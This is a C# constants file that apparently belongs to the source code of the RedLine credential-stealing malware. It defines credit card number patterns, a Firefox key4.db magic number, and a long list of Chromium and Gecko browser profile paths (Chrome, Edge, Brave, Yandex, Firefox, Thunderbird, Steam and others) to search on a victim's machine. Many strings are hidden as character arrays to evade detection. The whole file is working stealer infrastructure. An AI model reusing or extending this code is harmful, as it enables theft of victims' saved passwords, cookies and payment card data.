using System;
using System.Collections.Generic;
using System.IO;

namespace RedLine.Reburn.Data.Helpers;

public static class Constants
{
	public static Dictionary<string, string> CreditCardTypes;

	public static readonly byte[] Key4MagicNumber;

	public static List<string> logs;

	public static readonly string LocalAppData;

	public static readonly string RoamingAppData;

	public static List<string> chromiumBrowserPaths;

	public static List<string> geckoBrowserPaths;

	static Constants()
	{
		CreditCardTypes = new Dictionary<string, string>
		{
			{
				new string(new char[9] { 'A', 'm', 'e', 'x', ' ', 'C', 'a', 'r', 'd' }),
				"^3[47][0-9]{13}$"
			},
			{
				new string(new char[8] { 'B', 'C', 'G', 'l', 'o', 'b', 'a', 'l' }),
				"^(6541|6556)[0-9]{12}$"
			},
			{
				new string(new char[18]
				{
					'C', 'a', 'r', 't', 'e', ' ', 'B', 'l', 'a', 'n',
					'c', 'h', 'e', ' ', 'C', 'a', 'r', 'd'
				}),
				new string(new char[14]
				{
					'^', '3', '8', '9', '[', '0', '-', '9', ']', '{',
					'1', '1', '}', '$'
				})
			},
			{
				new string(new char[16]
				{
					'D', 'i', 'n', 'e', 'r', 's', ' ', 'C', 'l', 'u',
					'b', ' ', 'C', 'a', 'r', 'd'
				}),
				new string(new char[32]
				{
					'^', '3', '(', '?', ':', '0', '[', '0', '-', '5',
					']', '|', '[', '6', '8', ']', '[', '0', '-', '9',
					']', ')', '[', '0', '-', '9', ']', '{', '1', '1',
					'}', '$'
				})
			},
			{
				new string(new char[13]
				{
					'D', 'i', 's', 'c', 'o', 'v', 'e', 'r', ' ', 'C',
					'a', 'r', 'd'
				}),
				new string(new char[28]
				{
					'6', '(', '?', ':', '0', '1', '1', '|', '5', '[',
					'0', '-', '9', ']', '{', '2', '}', ')', '[', '0',
					'-', '9', ']', '{', '1', '2', '}', '$'
				})
			},
			{
				new string(new char[18]
				{
					'I', 'n', 's', 't', 'a', ' ', 'P', 'a', 'y', 'm',
					'e', 'n', 't', ' ', 'C', 'a', 'r', 'd'
				}),
				new string(new char[18]
				{
					'^', '6', '3', '[', '7', '-', '9', ']', '[', '0',
					'-', '9', ']', '{', '1', '3', '}', '$'
				})
			},
			{
				new string(new char[8] { 'J', 'C', 'B', ' ', 'C', 'a', 'r', 'd' }),
				new string(new char[31]
				{
					'^', '(', '?', ':', '2', '1', '3', '1', '|', '1',
					'8', '0', '0', '|', '3', '5', '\\', '\\', 'd', '{',
					'3', '}', ')', '\\', '\\', 'd', '{', '1', '1', '}',
					'$'
				})
			},
			{
				new string(new char[15]
				{
					'K', 'o', 'r', 'e', 'a', 'n', 'L', 'o', 'c', 'a',
					'l', 'C', 'a', 'r', 'd'
				}),
				new string(new char[12]
				{
					'^', '9', '[', '0', '-', '9', ']', '{', '1', '5',
					'}', '$'
				})
			},
			{
				new string(new char[10] { 'L', 'a', 's', 'e', 'r', ' ', 'C', 'a', 'r', 'd' }),
				new string(new char[35]
				{
					'^', '(', '6', '3', '0', '4', '|', '6', '7', '0',
					'6', '|', '6', '7', '0', '9', '|', '6', '7', '7',
					'1', ')', '[', '0', '-', '9', ']', '{', '1', '2',
					',', '1', '5', '}', '$'
				})
			},
			{
				new string(new char[12]
				{
					'M', 'a', 'e', 's', 't', 'r', 'o', ' ', 'C', 'a',
					'r', 'd'
				}),
				new string(new char[49]
				{
					'^', '(', '5', '0', '1', '8', '|', '5', '0', '2',
					'0', '|', '5', '0', '3', '8', '|', '6', '3', '0',
					'4', '|', '6', '7', '5', '9', '|', '6', '7', '6',
					'1', '|', '6', '7', '6', '3', ')', '[', '0', '-',
					'9', ']', '{', '8', ',', '1', '5', '}', '$'
				})
			},
			{
				new string(new char[10] { 'M', 'a', 's', 't', 'e', 'r', 'c', 'a', 'r', 'd' }),
				new string(new char[16]
				{
					'5', '[', '1', '-', '5', ']', '[', '0', '-', '9',
					']', '{', '1', '4', '}', '$'
				})
			},
			{
				new string(new char[9] { 'S', 'o', 'l', 'o', ' ', 'C', 'a', 'r', 'd' }),
				new string(new char[64]
				{
					'^', '(', '6', '3', '3', '4', '|', '6', '7', '6',
					'7', ')', '[', '0', '-', '9', ']', '{', '1', '2',
					'}', '|', '(', '6', '3', '3', '4', '|', '6', '7',
					'6', '7', ')', '[', '0', '-', '9', ']', '{', '1',
					'4', '}', '|', '(', '6', '3', '3', '4', '|', '6',
					'7', '6', '7', ')', '[', '0', '-', '9', ']', '{',
					'1', '5', '}', '$'
				})
			},
			{
				new string(new char[11]
				{
					'S', 'w', 'i', 't', 'c', 'h', ' ', 'C', 'a', 'r',
					'd'
				}),
				new string(new char[220]
				{
					'^', '(', '4', '9', '0', '3', '|', '4', '9', '0',
					'5', '|', '4', '9', '1', '1', '|', '4', '9', '3',
					'6', '|', '6', '3', '3', '3', '|', '6', '7', '5',
					'9', ')', '[', '0', '-', '9', ']', '{', '1', '2',
					'}', '|', '(', '4', '9', '0', '3', '|', '4', '9',
					'0', '5', '|', '4', '9', '1', '1', '|', '4', '9',
					'3', '6', '|', '6', '3', '3', '3', '|', '6', '7',
					'5', '9', ')', '[', '0', '-', '9', ']', '{', '1',
					'4', '}', '|', '(', '4', '9', '0', '3', '|', '4',
					'9', '0', '5', '|', '4', '9', '1', '1', '|', '4',
					'9', '3', '6', '|', '6', '3', '3', '3', '|', '6',
					'7', '5', '9', ')', '[', '0', '-', '9', ']', '{',
					'1', '5', '}', '|', '5', '6', '4', '1', '8', '2',
					'[', '0', '-', '9', ']', '{', '1', '0', '}', '|',
					'5', '6', '4', '1', '8', '2', '[', '0', '-', '9',
					']', '{', '1', '2', '}', '|', '5', '6', '4', '1',
					'8', '2', '[', '0', '-', '9', ']', '{', '1', '3',
					'}', '|', '6', '3', '3', '1', '1', '0', '[', '0',
					'-', '9', ']', '{', '1', '0', '}', '|', '6', '3',
					'3', '1', '1', '0', '[', '0', '-', '9', ']', '{',
					'1', '2', '}', '|', '6', '3', '3', '1', '1', '0',
					'[', '0', '-', '9', ']', '{', '1', '3', '}', '$'
				})
			},
			{
				new string(new char[14]
				{
					'U', 'n', 'i', 'o', 'n', ' ', 'P', 'a', 'y', ' ',
					'C', 'a', 'r', 'd'
				}),
				new string(new char[18]
				{
					'^', '(', '6', '2', '[', '0', '-', '9', ']', '{',
					'1', '4', ',', '1', '7', '}', ')', '$'
				})
			},
			{
				new string(new char[9] { 'V', 'i', 's', 'a', ' ', 'C', 'a', 'r', 'd' }),
				new string(new char[24]
				{
					'4', '[', '0', '-', '9', ']', '{', '1', '2', '}',
					'(', '?', ':', '[', '0', '-', '9', ']', '{', '3',
					'}', ')', '?', '$'
				})
			},
			{
				new string(new char[16]
				{
					'V', 'i', 's', 'a', ' ', 'M', 'a', 's', 't', 'e',
					'r', ' ', 'C', 'a', 'r', 'd'
				}),
				new string(new char[45]
				{
					'^', '(', '?', ':', '4', '[', '0', '-', '9', ']',
					'{', '1', '2', '}', '(', '?', ':', '[', '0', '-',
					'9', ']', '{', '3', '}', ')', '?', '|', '5', '[',
					'1', '-', '5', ']', '[', '0', '-', '9', ']', '{',
					'1', '4', '}', ')', '$'
				})
			},
			{
				new string(new char[12]
				{
					'E', 'x', 'p', 'r', 'e', 's', 's', ' ', 'C', 'a',
					'r', 'd'
				}),
				new string(new char[15]
				{
					'3', '[', '4', '7', ']', '[', '0', '-', '9', ']',
					'{', '1', '3', '}', '$'
				})
			}
		};
		Key4MagicNumber = new byte[16]
		{
			248, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 1
		};
		logs = new List<string>();
		LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
		RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
		chromiumBrowserPaths = new List<string>();
		geckoBrowserPaths = new List<string>();
		chromiumBrowserPaths.Add(new string(new char[19]
		{
			'\\', 'C', 'h', 'r', 'o', 'm', 'i', 'u', 'm', '\\',
			'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[24]
		{
			'\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h',
			'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ',
			'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[29]
		{
			'\\', 'G', 'o', 'o', 'g', 'l', 'e', '(', 'x', '8',
			'6', ')', '\\', 'C', 'h', 'r', 'o', 'm', 'e', '\\',
			'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[16]
		{
			'\\', 'O', 'p', 'e', 'r', 'a', ' ', 'S', 'o', 'f',
			't', 'w', 'a', 'r', 'e', '\\'
		}));
		chromiumBrowserPaths.Add(new string(new char[33]
		{
			'\\', 'M', 'a', 'p', 'l', 'e', 'S', 't', 'u', 'd',
			'i', 'o', '\\', 'C', 'h', 'r', 'o', 'm', 'e', 'P',
			'l', 'u', 's', '\\', 'U', 's', 'e', 'r', ' ', 'D',
			'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[18]
		{
			'\\', 'I', 'r', 'i', 'd', 'i', 'u', 'm', '\\', 'U',
			's', 'e', 'r', ' ', 'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[22]
		{
			'\\', '7', 'S', 't', 'a', 'r', '\\', '7', 'S', 't',
			'a', 'r', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a',
			't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[22]
		{
			'\\', 'C', 'e', 'n', 't', 'B', 'r', 'o', 'w', 's',
			'e', 'r', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a',
			't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[17]
		{
			'\\', 'C', 'h', 'e', 'd', 'o', 't', '\\', 'U', 's',
			'e', 'r', ' ', 'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add(new string(new char[18]
		{
			'\\', 'V', 'i', 'v', 'a', 'l', 'd', 'i', '\\', 'U',
			's', 'e', 'r', ' ', 'D', 'a', 't', 'a'
		}));
		chromiumBrowserPaths.Add("\\Kometa\\User Data");
		chromiumBrowserPaths.Add("\\Elements Browser\\User Data");
		chromiumBrowserPaths.Add("\\Epic Privacy Browser\\User Data");
		chromiumBrowserPaths.Add("\\uCozMedia\\Uran\\User Data");
		chromiumBrowserPaths.Add("\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer");
		chromiumBrowserPaths.Add("\\CatalinaGroup\\Citrio\\User Data");
		chromiumBrowserPaths.Add("\\Coowon\\Coowon\\User Data");
		chromiumBrowserPaths.Add("\\liebao\\User Data");
		chromiumBrowserPaths.Add("\\QIP Surf\\User Data");
		chromiumBrowserPaths.Add("\\Orbitum\\User Data");
		chromiumBrowserPaths.Add("\\Comodo\\Dragon\\User Data");
		chromiumBrowserPaths.Add("\\Amigo\\User\\User Data");
		chromiumBrowserPaths.Add("\\Torch\\User Data");
		chromiumBrowserPaths.Add("\\Yandex\\YandexBrowser\\User Data");
		chromiumBrowserPaths.Add("\\Comodo\\User Data");
		chromiumBrowserPaths.Add("\\360Browser\\Browser\\User Data");
		chromiumBrowserPaths.Add("\\Maxthon3\\User Data");
		chromiumBrowserPaths.Add("\\K-Melon\\User Data");
		chromiumBrowserPaths.Add("\\Sputnik\\Sputnik\\User Data");
		chromiumBrowserPaths.Add("\\Nichrome\\User Data");
		chromiumBrowserPaths.Add("\\CocCoc\\Browser\\User Data");
		chromiumBrowserPaths.Add("\\Uran\\User Data");
		chromiumBrowserPaths.Add("\\Chromodo\\User Data");
		chromiumBrowserPaths.Add("\\Mail.Ru\\Atom\\User Data");
		chromiumBrowserPaths.Add("\\BraveSoftware\\Brave-Browser\\User Data");
		chromiumBrowserPaths.Add("\\Microsoft\\Edge\\User Data");
		chromiumBrowserPaths.Add("\\NVIDIA Corporation\\NVIDIA GeForce Experience");
		chromiumBrowserPaths.Add("\\Steam");
		chromiumBrowserPaths.Add("\\CryptoTab Browser\\User Data");
		geckoBrowserPaths.Add("\\Mozilla\\Firefox");
		geckoBrowserPaths.Add("\\Waterfox");
		geckoBrowserPaths.Add("\\K-Meleon");
		geckoBrowserPaths.Add("\\Thunderbird");
		geckoBrowserPaths.Add("\\Comodo\\IceDragon");
		geckoBrowserPaths.Add("\\8pecxstudios\\Cyberfox");
		geckoBrowserPaths.Add("\\NETGATE Technologies\\BlackHaw");
		geckoBrowserPaths.Add("\\Moonchild Productions\\Pale Moon");
	}
}
